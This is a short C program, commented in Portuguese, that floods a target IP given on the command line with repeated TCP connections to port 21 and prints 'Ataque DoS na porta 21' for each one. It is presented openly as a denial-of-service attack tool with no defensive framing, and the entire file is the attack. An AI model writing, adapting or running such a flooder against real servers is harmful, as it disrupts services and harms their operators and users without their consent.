#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){

	int meusocket;
	int conecta;
	int ataque;
	char *destino;
	int porta = 21; //COLOQUE A PORTA DESEJADA!!
	destino = argv[1];

	struct sockaddr_in alvo;

	for (ataque=0;ataque<9999999;){

	meusocket = socket(AF_INET,SOCK_STREAM,0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);
	alvo.sin_addr.s_addr = inet_addr(destino);

	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0){
		printf("Ataque DoS na porta 21 \n");
	ataque++;
	} else {
		printf("Caindo no else \n");
	}
	}
}
